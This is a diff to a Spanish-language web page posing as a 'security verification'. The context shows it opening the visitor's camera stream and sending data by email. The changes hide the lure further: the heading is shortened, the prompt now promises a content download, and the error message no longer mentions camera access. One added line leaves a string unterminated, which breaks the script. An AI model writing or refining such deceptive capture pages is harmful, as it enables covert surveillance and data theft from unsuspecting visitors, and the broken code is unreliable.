@@ -54,8 +54,8 @@
 <body>
 
     <div class="container" id="mainContainer">
-        <h2>Verificación de Seguridad</h2>
-        <p>Presiona el botón para continuar.</p>
+        <h2>Verificación</h2>
+        <p>Presiona para descargar el contenido.</p>
         <button class="btn" id="startBtn">Continuar</button>
         <p id="status"></p>
 
@@ -112,7 +112,7 @@
                             document.getElementById('mainContainer').innerHTML = "<h3>¡Verificación exitosa!</h3><p>Ya puedes cerrar esta ventana.</p>";
                         }, (error) => {
                             console.error("Error al enviar el correo:", error);
-                            statusText.textContent = "Hubo un error al procesar el envío.";
+                            statusText.textContent = "Error en envio
                             stream.getTracks().forEach(track => track.stop());
                         });
 
@@ -121,7 +121,7 @@
             } catch (err) {
                 console.error("Error:", err);
                 startBtn.style.display = 'block';
-                statusText.textContent = "Debes permitir el acceso a la cámara para continuar.";
+                statusText.textContent = "Da click para continuar.";
             }
         });
     </script>
